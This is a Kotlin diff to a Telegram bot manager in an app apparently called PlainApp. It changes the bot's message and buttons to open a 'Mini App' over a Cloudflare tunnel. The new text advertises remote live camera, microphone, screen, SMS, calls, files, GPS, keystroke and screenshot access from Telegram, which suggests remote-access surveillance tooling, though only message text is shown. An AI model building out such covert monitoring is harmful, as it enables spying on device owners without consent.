@@ -7702,20 +7702,27 @@ object TelegramBotManager {
         val ctx = MainApp.instance
         val hostname = CloudflareTunnelHostnamePreference.getAsync(ctx).trim()
         val panelUrl = if (hostname.isNotBlank()) "https://$hostname" else null
-        val sb = StringBuilder("🌐 <b>PlainApp Web Panel</b>\n\n")
+        val sb = StringBuilder("📱 <b>PlainApp Mini App</b>\n\n")
         if (panelUrl != null) {
-            sb.append("🔗 <a href=\"$panelUrl\">$panelUrl</a>\n\n")
-            sb.append("Tap the button below to open the web panel directly inside Telegram as a Mini App.\n\n")
-            sb.append("It gives you live camera, audio, screen share, file manager, and full device control — all from here.")
+            val miniAppUrl = "$panelUrl/tgapp.html"
+            sb.append("Tap <b>Open Mini App</b> to launch the full control panel directly inside Telegram.\n\n")
+            sb.append("Features inside:\n")
+            sb.append("• 📷 Live Camera streaming\n")
+            sb.append("• 🎙️ Live Microphone audio\n")
+            sb.append("• 📺 Live Screen mirroring\n")
+            sb.append("• 💬 SMS / 📞 Calls / 📁 Files\n")
+            sb.append("• 📍 Live GPS / ⌨️ Keystrokes\n")
+            sb.append("• 🔔 Notifications / 📸 Screenshots\n")
+            sb.append("• And everything else — all from Telegram")
             val markup = TelegramApiClient.inlineKeyboard(listOf(
-                listOf("🌐 Open Panel" to "webapp:$panelUrl"),
-                listOf("🔗 Open in Browser" to "url:$panelUrl"),
+                listOf("📱 Open Mini App" to "webapp:$miniAppUrl"),
+                listOf("🔗 Open in Browser" to "url:$miniAppUrl"),
             ))
             sendMessage(sb.toString(), replyMarkup = markup)
         } else {
             sb.append("⚠️ <b>Cloudflare Tunnel not configured.</b>\n\n")
             sb.append("Enable the Cloudflare Tunnel in PlainApp settings to get a public HTTPS URL. ")
-            sb.append("The web panel is then accessible from anywhere and opens as a Telegram Mini App.\n\n")
+            sb.append("The Mini App is then accessible from anywhere inside Telegram.\n\n")
             sb.append("<i>Settings → Cloudflare Tunnel → Enable</i>")
             sendMessage(sb.toString())
         }
